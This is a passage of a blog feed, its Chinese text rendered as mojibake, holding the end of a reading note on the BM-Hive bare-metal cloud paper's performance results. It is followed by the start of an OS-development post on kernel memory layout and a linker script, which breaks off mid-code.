id="4-3-I-O-Performance"><a href="#4-3-I-O-Performance" class="headerlink" title="4.3 I&#x2F;O Performance"></a>4.3 I&#x2F;O Performance</h2><p><code>bm-guest</code> ä¸ <code>vm-guest</code> æœ‰ç€è¿‘ä¹ä¸€æ ·çš„åŸºäº virtio çš„ IO è·¯å¾„ï¼Œä½† <code>BM-Hive</code> æœ‰ç€è½¯ç¡¬ä»¶ç»“åˆçš„è®¾è®¡ï¼Œæœ¬èŠ‚æˆ‘ä»¬å¯¹æ¯”åŒä¸€äº‘ç½‘ç»œä¸å­˜å‚¨ä¸‹çš„æ€§èƒ½ï¼Œguests ç½‘é€Ÿè¢«é™åˆ¶åœ¨ 4M PPS ä¸ 10Gbps çš„å¸¦å®½ï¼Œå­˜å‚¨è¢«é™åˆ¶åœ¨ 25 IOPS ä¸ 300 MBps çš„å¸¦å®½</p><p><strong>Network performance</strong> ï¼šä½œè€…ä½¿ç”¨ <code>netperf-2.5</code> åœ¨ä¸¤ä¸ª <code>bm-guest</code> é—´æ”¶å‘ UDP åŒ…ï¼ˆå¹¶æ·»åŠ  <code>vm-guest</code> å¯¹ç…§ç»„ï¼‰ï¼Œç»“æœå¦‚å›¾ 9 æ‰€ç¤ºï¼Œ <code>bm-guest</code> ä¸ <code>vm-guest</code> éƒ½è¾¾åˆ°äº† 3.2M PPSï¼Œç”±äº <code>BM-Hive</code> çš„ I&#x2F;O è·¯å¾„æ›´é•¿æ‰€ä»¥ <code>vm-guest</code> æœ‰ç€æ›´å°‘çš„æŠ–åŠ¨</p><p><img src="https://s2.loli.net/2024/07/26/J9iERPS8zLXpCdU.png" alt="Figure 9. UDP packet receive rate"></p><p>ä½œè€…ä½¿ç”¨ä¸åŒçš„å·¥å…·å¯¹æ¯”äº† <code>bm-guest</code> ä¸ <code>vm-guest</code> çš„å»¶è¿Ÿä»¥æµ‹ç®— IO-Bond å¼€é”€ï¼Œå›¾ 10 æ˜¾ç¤ºäº†ä½¿ç”¨ <code>sockperf-3.5</code> æµ‹è¯• UDP çš„ç»“æœï¼ˆå¹¶ä½¿ç”¨ DPDK ç»•è¿‡å†…æ ¸ï¼‰ï¼Œç”±äº <code>BM-Hive</code> çš„ I&#x2F;O è·¯å¾„æ›´é•¿æ‰€ä»¥ <code>vm-guest</code> ç»“æœæ›´å¥½ï¼ˆåœ¨ ICMP ä¸Šä¹Ÿæ˜¯ï¼‰</p><p><img src="https://s2.loli.net/2024/07/26/7TVJfov5DQeHd8n.png" alt="Figure 10. UDP and ping latency"></p><p>ååé‡ä¹Ÿæ˜¯ç½‘ç»œæ€§èƒ½çš„é‡ç‚¹ï¼Œä½œè€…ä½¿ç”¨ <code>netperf-2.5</code> æµ‹è¯• 64  ä¸ªå•ä¸ªæ•°æ®åŒ…ä¸º 1400B çš„ TCP è¿æ¥ï¼Œ<code>bm-guest</code> ä¸º 9.6 Gbpsï¼Œ <code>vm-guest</code> ä¸º 9.59 Gbps</p><p>æ€»ä¹‹ï¼Œ<code>BM-Hive</code> æ€§èƒ½æ»¡è¶³è®¾è®¡ç›®çš„ï¼Œæ­¤å¤–ä½œè€…é€šè¿‡å–æ¶ˆ PPS é™åˆ¶æ¥æµ‹é‡å…¶æœ€å¤§ç½‘ç»œæ€§èƒ½ï¼ˆå¯ä»¥è¾¾åˆ° 16M PPSï¼‰</p><p><strong>Storage performance</strong> ï¼šä½œè€…é€šè¿‡100Gbps ç½‘ç»œè®¿é—® SSD äº‘å­˜å‚¨è¿è¡Œ fio benchmark ä½¿ç”¨ 8 çº¿ç¨‹è¿›è¡Œ 4KB éšæœºè¯»å†™ï¼Œ <code>bm-guest</code> ä¸ <code>vm-guest</code> éƒ½æ˜¯é¥±å’Œå­˜å‚¨é€Ÿç‡ï¼Œä½†å¦‚å›¾ 11 æ‰€ç¤º <code>bm-guest</code> æœ‰æ›´ä½çš„å¹³å‡å»¶è¿Ÿä¸ 99.9% å»¶è¿Ÿ</p><p><img src="https://s2.loli.net/2024/07/26/BKcsrvJhi26TnO8.png" alt="Figure 11. Storage I/O latency"></p><p>ä½œè€…è¿˜æµ‹è¯•äº†æ— é™åˆ¶çš„è®¿é—®æœ¬åœ° SSD çš„å­˜å‚¨æ€§èƒ½ï¼Œ <code>BM-Hive</code> åœ¨ IOPS ä¸Šæ¯” VM å¿« 50%ï¼Œåœ¨å¸¦å®½ä¸Šå¿« 100%ï¼Œå¹³å‡å»¶è¿Ÿä»…ä¸º 60Âµs</p><p>æ€»ä¹‹ï¼Œ<code>BM-Hive</code> çš„å­˜å‚¨æ€§èƒ½å¾—ç›Šäº IO-Bond çš„ DMA å¼•æ“è€Œæ¯”éœ€è¦é¢å¤–å†…å­˜æ‹·è´çš„ VM æ›´å¥½</p><p><strong>Summary</strong> ï¼š<code>bm-guest</code> ä¸ <code>vm-guest</code> éƒ½èƒ½è¾¾åˆ°åŸºäºäº‘çš„ç½‘ç»œä¸å­˜å‚¨ IO é™åˆ¶ï¼Œä½† <code>bm-guest</code> åœ¨æ›´åæƒ…å†µï¼ˆ99.9 percentileï¼‰ä¸‹æ›´å¥½ï¼Œåœ¨æ— é™åˆ¶ä¸‹æ¯” <code>vm-guest</code> æ€§èƒ½æ˜¾è‘—æé«˜</p><h2 id="4-4-Application-Performance"><a href="#4-4-Application-Performance" class="headerlink" title="4.4 Application Performance"></a>4.4 Application Performance</h2><p>ä¸€ä¸ªé‡è¦çš„å®éªŒæ˜¯ <code>BM-Hive</code> æ‰§è¡Œäº‘ä¸Šå¸¸ç”¨åº”ç”¨çš„æ€§èƒ½ï¼Œæµ‹è¯•ç»“æœå¦‚å›¾ 12ã€13ã€14 æ‰€ç¤º</p><blockquote><p>è¯¦ç»†çš„å®éªŒæ•°æ®å°±ä¸æŠ„äº†ï¼Œè‡ªå·±å»çœ‹åŸæ–‡ï¼ˆç¬‘ï¼‰</p></blockquote><p><img src="https://s2.loli.net/2024/07/26/T4Pt6phkYzZOb2x.png" alt="Figure 12. NGINX Figure 13. MariaDB ready-only Figure 14. MariaDB rd/wr and wr-only Figure 15. Redis with varying clients Figure 16. Redis with varying data size"></p><p><strong>Summary</strong> ï¼š <code>BM-Hive</code> è¿è¡Œæµè¡Œäº‘ä¸Šåº”ç”¨çš„æ€§èƒ½æ¯”åŸºäºè™šæ‹ŸåŒ–çš„äº‘æœåŠ¡æ›´å¥½</p><h1 id="0x05-Related-Work"><a href="#0x05-Related-Work" class="headerlink" title="0x05. Related Work"></a>0x05. Related Work</h1><p><strong>Reducing world switches</strong> ï¼šè™šæ‹ŸåŒ–çš„ä¸»è¦å¼€é”€ä¹‹ä¸€ä¾¿æ˜¯ guest ä¸ hypervisor é—´çš„åˆ‡æ¢ï¼Œæœ‰ä¸€éƒ¨åˆ†å·¥ä½œä¾¿å…³æ³¨äºå‡å°‘åˆ‡æ¢ï¼Œä¾‹å¦‚å½¢å¦‚ç½‘å¡çš„é«˜é€Ÿé©±åŠ¨ä¼šäº§ç”Ÿå¤§é‡ä¸­æ–­ï¼Œ<a href="https://dl.acm.org/doi/pdf/10.1145/2248487.2151020">ELI</a> ï¼ˆExit-Less Interruptï¼‰è‡´åŠ›äºå°† hypervisor ä»ä¸­æ–­è·¯å¾„ä¸Šç§»é™¤ä»è€Œè®© Guest ç›´æ¥å¤„ç†ä¸­æ–­ä»¥æé«˜ååé‡å¹¶å‡å°‘å»¶è¿Ÿï¼›æ­¤å¤–åœ¨ guest ä¾§ä¹Ÿæœ‰ä¼˜åŒ–ç©ºé—´ï¼Œå¦‚ KVM æœ€è¿‘å¼•å…¥çš„ <code>halt_polling</code> ç‰¹æ€§åœ¨è®© CPU ä¼‘çœ å‰æ‹‰å–å”¤é†’è¯·æ±‚ä»¥é¿å… guest åœ¨ä¼‘çœ ååˆç«‹å³è¢«ç­‰å¾…ä¸­çš„å”¤é†’è¯·æ±‚å”¤é†’ï¼›ä½† <code>BM-Hive</code> ä¸ä¼šæœ‰è¿™äº›é—®é¢˜</p><p><strong>Memory virtualization</strong> ï¼šå†…å­˜é€šå¸¸è¢«è™šæ‹ŸåŒ–ä¸ºä¸¤çº§é¡µè¡¨ï¼šGVAâ¡ï¸GPAâ¡ï¸HPAï¼Œå› æ­¤ç°æœ‰å·¥ä½œä¹‹ä¸€ä¾¿æ˜¯å‡å°‘å¼€é”€æå¤§çš„ TLB miss ï¼Œå¦‚å¢å¤§ TLB è¦†ç›–ç‡ï¼ˆä¾‹å¦‚ä½¿ç”¨å¤§é¡µï¼‰æˆ–å‡å°‘ TLB æƒ©ç½šï¼Œå¦‚ <a href="https://dl.acm.org/doi/10.1145/3140659.3080210">POM-TLB</a> ä¾¿æ˜¯å°†å†…å­˜çš„ä¸€éƒ¨åˆ†ä½œä¸º TLB ä»¥å¢å¤§ TLBï¼Œæˆ–æ˜¯<a href="https://www.usenix.org/conference/atc17/technical-sessions/presentation/amit">è·Ÿè¸ªé¡µè®¿é—®ä»¥ç»´æŠ¤ TLB è€Œå‡å°‘ TLB miss</a>ï¼›ä½† <code>BM-Hive</code> ä¸ä¼šæœ‰è¿™äº›é—®é¢˜</p><p><strong>Device virtualization</strong> ï¼šç°æœ‰è™šæ‹Ÿè®¾å¤‡å¤§éƒ½é€šè¿‡åŠè™šæ‹ŸåŒ–å®ç°ï¼Œæœ€æµè¡Œçš„ä¾¿æ˜¯ virtio ï¼Œæ­¤å¤–å¦‚ SR-IOV ç½‘å¡ç­‰ä¹Ÿæ”¯æŒåŸç”Ÿè™šæ‹ŸåŒ–ï¼›ç‰¹åˆ«åœ°ï¼Œ<code>BM-Hive</code> é€šè¿‡æ··åˆæ–¹å¼å®ç°äº† virtio ä»¥ä¸ç°æœ‰äº‘åŸºç¡€æ¶æ„äº¤äº’</p><p><strong>Minimal hypervisor</strong> ï¼šä¹Ÿæœ‰ä¸€äº›å·¥ä½œå…³æ³¨äºåˆ›å»ºæœ€å°çš„ hypervisor ï¼Œå¦‚ Intel çš„ ACRN ä¾¿æ˜¯ç”¨äºåµŒå…¥å¼ IOT è®¾å¤‡çš„å°å‹ hypervisor ï¼ˆ <del>ç¬”è€…æ³¨ï¼šåµŒå…¥å¼è®¾å¤‡è¿˜è¦è·‘ VMï¼Ÿ</del> ï¼‰ï¼›<code>BM-Hive</code> æ¯”ä¼ ç»Ÿçš„ hypervisor éƒ½ç®€å•ï¼Œå› ä¸ºå…¶å¹¶ä¸è™šæ‹ŸåŒ–ä»»ä½•ä¸œè¥¿ï¼Œä¹Ÿä¸ç›´æ¥ä¸ <code>bm-guest</code> äº¤äº’</p><p><strong>Nest hypervisor</strong> ï¼š<code>BM-Hive</code> ç›®æ ‡ä¹‹ä¸€ä¾¿æ˜¯è®©ç”¨æˆ·èƒ½è¿è¡Œè‡ªå·±çš„è™šæ‹Ÿæœºï¼Œåœ¨ä¼ ç»Ÿæ¶æ„ä¸ŠåµŒå¥—è™šæ‹ŸåŒ–å¯ä»¥å®ç°ä½†å¼€é”€è¾ƒå¤§ï¼Œ<code>BM-Hive</code> çš„ç”¨æˆ·ç›´æ¥è¿è¡Œåœ¨ç‰©ç† CPU ä¸Šå› è€Œæœ‰ç€å®Œå…¨çš„ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒ</p><p><strong>Other bare-metal services</strong> ï¼šç»å¤§éƒ¨åˆ†å…¬æœ‰äº‘éƒ½éƒ¨ç½²äº†å•ç§Ÿæˆ·è£¸é‡‘å±æœåŠ¡ï¼Œé™åˆ¶å¦‚ç¬¬ 1 èŠ‚æ‰€ç¤ºï¼›éƒ¨åˆ†å…¬æœ‰äº‘ä¹Ÿä¸º VM éƒ¨ç½²äº†ç‰¹æ®Šçš„ç½‘ç»œè®¾å¤‡ï¼Œä¾‹å¦‚ Azure ä¹Ÿæœ‰æ™ºèƒ½ç½‘å¡ï¼Œä½†æ®ä½œè€…æ‰€çŸ¥å…¶æ›´å…³æ³¨åº•å±‚äº‘åŸºç¡€æ¶æ„çš„ä¼˜åŒ–ï¼Œè€Œ <code>BM-Hive</code> å¹¶ä¸æ¥è§¦äº‘åŸºç¡€æ¶æ„å±‚</p><p>ä¹Ÿæœ‰éƒ¨åˆ†ç³»ç»Ÿæœ‰ç€ç›¸ä¼¼çš„æ•´ä½“æ¶æ„ï¼Œå¦‚ Intel çš„ VCA2 ä¾¿æ˜¯ä¸€ä¸ªå¸¦æœ‰ä¸‰ä¸ª Xeon E3 v1258L å¤„ç†å™¨çš„ PCIe å¡ï¼Œä½† <code>BM-Hive</code>  æ˜¯ä¸ºäº†äº‘æœåŠ¡è€Œç”Ÿçš„</p><h1 id="0x06-Discussion"><a href="#0x06-Discussion" class="headerlink" title="0x06. Discussion"></a>0x06. Discussion</h1><p>æœ¬èŠ‚è®¨è®º <code>BM-Hive</code> çš„æ½œåœ¨æå‡ä¸æœªæ¥ç ”ç©¶è®¡åˆ’</p><p><strong>Improvements to IO-Bond</strong> ï¼š IO-Bond çš„è®¾è®¡å¯ä»¥è¿›è¡Œä¼˜åŒ–ï¼ˆä¾‹å¦‚å°†åŒ…å¤„ç†ä» <code>bm-hypervisor</code> å¸è½½åˆ° IO-Bond ä¸Šï¼‰ï¼Œé™¤äº†ä½¿ç”¨ FPGA ä»¥å¤–ä¹Ÿå¯ä»¥ä½¿ç”¨ ASIC å®ç°</p><p><strong>Live Migration and Upgrade</strong> ï¼šè™šæ‹ŸæœºåŠ¨æ€è¿ç§»éå¸¸é‡è¦ï¼Œ<a href="https://dl.acm.org/doi/10.1145/3297858.3304034">Orthus</a> è¢«ç”¨äºåœ¨ä¸åœæ­¢è™šæ‹Ÿæœºçš„æƒ…å†µä¸‹åŠ¨æ€å‡çº§ VMMï¼Œ<code>BM-Hive</code> çš„è®¾è®¡ä½¿å…¶å¯ä»¥ç›´æ¥åº”ç”¨ Orthus çš„æ–¹æ¡ˆå‡çº§ VMMï¼Œä½† <code>bm-guest</code> çš„è¿ç§»åˆ™æ›´æœ‰æŒ‘æˆ˜ï¼Œç›®å‰çš„æ–¹æ¡ˆæ˜¯æ’å…¥ä¸€ä¸ªè™šæ‹ŸåŒ–æ›¾å¹¶å°†å…¶è½¬æ¢ä¸º <code>vm-guest</code> ï¼Œä½†ä»å­˜åœ¨ä¼˜åŒ–ç©ºé—´</p><p><strong>SGX Support</strong> ï¼šSGX æ˜¯ä¸€ä¸ªå¯ä¿¡æ‰§è¡Œç¯å¢ƒï¼Œä½†ç›®å‰çš„è™šæ‹Ÿæœºä¸å¥½ä½¿ç”¨è¿™ä¸ªä¸œè¥¿ï¼Œä½œè€…è®¡åˆ’åœ¨æœªæ¥ä¸º <code>BM-Hive</code> æ·»åŠ åŸç”Ÿ SGX æ”¯æŒ</p><h1 id="0x07-Summary"><a href="#0x07-Summary" class="headerlink" title="0x07. Summary"></a>0x07. Summary</h1><p>ä½œè€…è®¾è®¡äº† <code>BM-Hive</code> å¹¶è¿›è¡Œäº†è¯„ä¼°ï¼Œå¾ˆå¥½å¾ˆå¼ºå¤§ğŸ‡ğŸ†ğŸ‡</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‡ºèµ°å­—èŠ‚ IaaS å¼€å‘å®ä¹ ä¸¤å¹´ï¼Œå½’æ¥è¯»å®‰å…¨ PhD ä¾ç„¶åœ¨åš DPU&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="ç³»ç»Ÿè™šæ‹ŸåŒ–" scheme="https://arttnba3.github.io/tags/%E7%B3%BB%E7%BB%9F%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="äº‘è®¡ç®—" scheme="https://arttnba3.github.io/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
    <category term="DPU" scheme="https://arttnba3.github.io/tags/DPU/"/>
    
    <category term="è£¸é‡‘å±" scheme="https://arttnba3.github.io/tags/%E8%A3%B8%E9%87%91%E5%B1%9E/"/>
    
  </entry>
  
  <entry>
    <title>ã€CODE.0x04ã€‘ç°ä»£ 64 ä½ OS å¼€å‘æ‰‹è®° IIï¼šå†…æ ¸å†…å­˜åˆ†é…å™¨ä¸ C++ çš„åˆæ­¥å¼•å…¥</title>
    <link href="https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/"/>
    <id>https://arttnba3.github.io/2024/06/30/CODE-0X04-OSDEV64-II_MEMORY-MANAGE/</id>
    <published>2024-06-30T13:39:41.000Z</published>
    <updated>2024-10-11T02:54:24.669Z</updated>
    
    <content type="html"><![CDATA[<p>Good old MEMORIES has goneâ€¦</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ä¸çŸ¥ä¸è§‰è¿™ä¸ªç³»åˆ—çš„æ–‡ç« å±…ç„¶å·²ç»é¸½äº†å¤§åŠå¹´äº†â€¦è™½ç„¶è¯´å·²ç»æ‹–äº†è¿™ä¹ˆä¹…æ²¡æœ‰ç»§ç»­è¿›è¡Œä¸‹ä¸€æ­¥çš„ä»£ç ç¼–å†™ï¼Œä¸è¿‡ç¬”è€…ç›®å‰æš‚æ—¶å¹¶æ²¡æœ‰æ”¾å¼ƒè¿™ä¸ªé¡¹ç›®ï¼Œåªæ˜¯ç¡®å®ä¸åƒæœ¬ç§‘é‚£æ ·èƒ½æœ‰å¤§æ®µå¤§æ®µçš„ç©ºé—²æ—¶é—´å»æŠ›å¼€ä¸€åˆ‡å»åšè‡ªå·±æƒ³åšçš„äº‹æƒ…äº†ï¼šï¼‰</p><p>è¨€å½’æ­£ä¼ ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬å°†è¦è„±ç¦»å¼•å¯¼é˜¶æ®µï¼Œè¿›å…¥åˆ°ä½äºé«˜åœ°å€çš„çœŸæ­£çš„å†…æ ¸ï¼Œå¹¶å»ºç«‹å†…å­˜ç®¡ç†ç³»ç»Ÿï¼Œç¬”è€…é€‰æ‹©ä¼˜å…ˆå®ç°å†…å­˜ç®¡ç†çš„åŸå› æ˜¯å› ä¸ºè¿™æ˜¯ä¸€ä¸ªéå¸¸æ ¸å¿ƒçš„æ¨¡å—ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸çš„å„ä¸ªéƒ¨åˆ†å‡ ä¹éƒ½æ— æ—¶æ— åˆ»ä¸åœ¨è¿›è¡ŒåŠ¨æ€å†…å­˜åˆ†é…ä¸é‡Šæ”¾ï¼Œå› æ­¤å®Œæˆäº†è¿™ä¸ªæ¨¡å—çš„å¼€å‘ä¹‹åæˆ‘ä»¬åç»­çš„å·¥ä½œä¹Ÿèƒ½å˜å¾—æ›´åŠ æ–¹ä¾¿</p><p>æœ¬é¡¹ç›®ä»£ç å¼€æºåœ¨ <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><blockquote><p>æ³¨ï¼š <strong>æœ¬ç« æš‚æ—¶çœç•¥äº†å¸¸è§„çš„å†…æ ¸è¾“å‡ºè¯­å¥</strong> ï¼ˆå¦‚ç±»ä¼¼ <code>printk()</code> çš„ä¸œè¥¿ï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹ä¸€ç« å®Œæˆå›¾å½¢ä¸ä¸²å£é©±åŠ¨åˆå§‹åŒ–åå†é‡æ–°å¼•å…¥è¿™éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦‚è‹¥ä½ éœ€è¦æŸ¥çœ‹è°ƒè¯•ä¿¡æ¯ï¼Œåˆ™å¯ä»¥ <em>ä¸´æ—¶é‡æ–°å¼•å…¥</em> boot é˜¶æ®µçš„è¾“å‡ºæ¨¡å—</p></blockquote><blockquote><p>æ³¨2ï¼šæœ¬ç« é¢å¤–å¼•å…¥äº†éƒ¨åˆ†è¾…åŠ©ç”¨çš„åŸºç¡€å†…æ ¸æ•°æ®ç»“æ„ï¼ˆä¾‹å¦‚åŒå‘é“¾è¡¨ï¼‰ï¼Œç”±äºå…¶å®ç°ç®€å•ä¸”å¹¶éè®²è¿°é‡ç‚¹ï¼Œå› æ­¤æœ¬æ–‡ <strong>ä¸ä¼šè¯¦ç»†å™è¿°æ‰€æœ‰é¢å¤–æ·»åŠ äº†çš„ä¸œè¥¿</strong> ï¼Œè€Œæ˜¯ä»…å…³æ³¨äº <code>å†…å­˜åˆ†é…</code> è¿™ä¸€ä¸»çº¿ï¼Œå¯¹äºæ­¤ç±»åŸºç¡€æ•°æ®ç»“æ„çš„å®ç°æ–¹å¼æ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡ŒæŸ¥çœ‹æºç ï¼šï¼‰</p></blockquote><h2 id="å†…æ ¸å†…å­˜å¸ƒå±€è®¾å®šä¸é“¾æ¥è„šæœ¬è°ƒæ•´"><a href="#å†…æ ¸å†…å­˜å¸ƒå±€è®¾å®šä¸é“¾æ¥è„šæœ¬è°ƒæ•´" class="headerlink" title="å†…æ ¸å†…å­˜å¸ƒå±€è®¾å®šä¸é“¾æ¥è„šæœ¬è°ƒæ•´"></a>å†…æ ¸å†…å­˜å¸ƒå±€è®¾å®šä¸é“¾æ¥è„šæœ¬è°ƒæ•´</h2><p>ç›®å‰æˆ‘ä»¬æš‚å®šçš„å†…æ ¸å†…å­˜å¸ƒå±€å¦‚ä¸‹æ‰€ç¤ºï¼Œç¬”è€…åœ¨è®¾è®¡æ—¶å°½é‡ä½¿å„ä¸ªåŒºåŸŸéƒ½å¯¹é½åˆ°ä¸€ä¸ªå››çº§é¡µè¡¨æ¡ç›® ï¼ˆ512 GBï¼‰ï¼Œä»è€Œä½¿å¾—æˆ‘ä»¬åœ¨åç»­åˆ›å»ºè¿›ç¨‹æ—¶æ— éœ€é‡å¤æ‹·è´è¿‡å¤šçš„å†…æ ¸é¡µè¡¨é¡¹ï¼Œè€Œå¯ä»¥å°½é‡è¿›è¡Œå¤ç”¨ï¼š</p><table><thead><tr><th align="center">Start address</th><th align="center">End address</th><th align="center">Size</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">0x0000000000000000</td><td align="center">0x00007FFFFFFFFFFF</td><td align="center">128TB</td><td align="center">memory space for user-mode process, isolate for per one</td></tr><tr><td align="center">0x0000800000000000</td><td align="center">0xFFFF7FFFFFFFFFFF</td><td align="center">16776960 TB</td><td align="center">unused hole</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">shared kernel-space virtual memory for all processes</td></tr><tr><td align="center">0xFFFF800000000000</td><td align="center">0xFFFFBFFFFFFFFFFF</td><td align="center">64TB</td><td align="center">direct mapping of first 64TB physical memory (physmem_base)</td></tr><tr><td align="center">0xFFFFC00000000000</td><td align="center">0xFFFFCFFFFFFFFFFF</td><td align="center">16TB</td><td align="center">dynamic kernel memory mapping region (vmremap_base)</td></tr><tr><td align="center">0xFFFFD00000000000</td><td align="center">0xFFFFEFFFFFFFFFFF</td><td align="center">32TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFF00000000000</td><td align="center">0xFFFFF7FFFFFFFFFF</td><td align="center">8TB</td><td align="center">page database (pgdb_base)</td></tr><tr><td align="center">0xFFFFF80000000000</td><td align="center">0xFFFFF9FFFFFFFFFF</td><td align="center">2TB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFA0000000000</td><td align="center">0xFFFFFA0FFFFFFFFF</td><td align="center">64GB</td><td align="center">kernel stack, isolate for each process</td></tr><tr><td align="center">0xFFFFFA1000000000</td><td align="center">0xFFFFFF7FFFFFFFFF</td><td align="center">5568GB</td><td align="center">unused hole</td></tr><tr><td align="center">0xFFFFFF8000000000</td><td align="center">0xFFFFFF800FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .text segment</td></tr><tr><td align="center">0xFFFFFF8010000000</td><td align="center">0xFFFFFF801FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .data segment</td></tr><tr><td align="center">0xFFFFFF8020000000</td><td align="center">0xFFFFFF802FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .rodata segment</td></tr><tr><td align="center">0xFFFFFF8030000000</td><td align="center">0xFFFFFF803FFFFFFF</td><td align="center">256MB</td><td align="center">kernel .bss segment</td></tr><tr><td align="center">0xFFFFFF8050000000</td><td align="center">0xFFFFFFFFFFFFFFFF</td><td align="center">511GB</td><td align="center">unused hole</td></tr></tbody></table><p>ç›¸åº”åœ°ï¼Œæˆ‘ä»¬éœ€è¦ç•¥å¾®è°ƒæ•´ä¸€ä¸‹åŸæœ‰çš„é“¾æ¥è„šæœ¬ä¸­çš„å†…æ ¸éƒ¨åˆ†ï¼Œåœ¨ç¬¬ä¸€ç« æ—¶ç¬”è€…ä»…æ˜¯ç®€å•åœ°å°†å…¶æ”¾ç½®åœ¨é«˜å†…å­˜åŒºåŸŸï¼Œç°åœ¨æˆ‘ä»¬æ ¹æ®å¦‚ä¸Šæ‰€ç¤ºå†…å­˜å¸ƒå±€è¿›è¡Œè°ƒæ•´ï¼Œè¿™é‡Œæ³¨æ„è®¡ç®—å„ä¸ªæ®µçš„ç‰©ç†ä½ç½®ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs stata">OUTPUT_FORMAT(<span class="hljs-string">&quot;elf64-x86-64&quot;</span>)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    <span class="hljs-comment">/* boot loader will load the kernel there */</span><br>    . = 1M;<br>__boot_start = .;<br><br><span class="hljs-comment">/* ASM boot-state kernel */</span><br><br>    .<span class="hljs-keyword">boot</span>.loader :<br>&#123;<br><span class="hljs-keyword">KEEP</span>(*(.<span class="hljs-keyword">boot</span>.header))<br><span class="hljs-comment">*(.boot.*)</span><br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a<br>&#125;<br><br>. = ALIGN(4096);<br><br><span class="hljs-comment">/* C boot-state kernel */</span><br><br>.<span class="hljs-keyword">boot</span>.text ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span class="hljs-keyword">boot</span>/libBoot.a(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.<span class="hljs-keyword">boot</span>.rodata ALIGN(4096) :<br>&#123;<br><span class="hljs-keyword">arch</span>/x86/<span 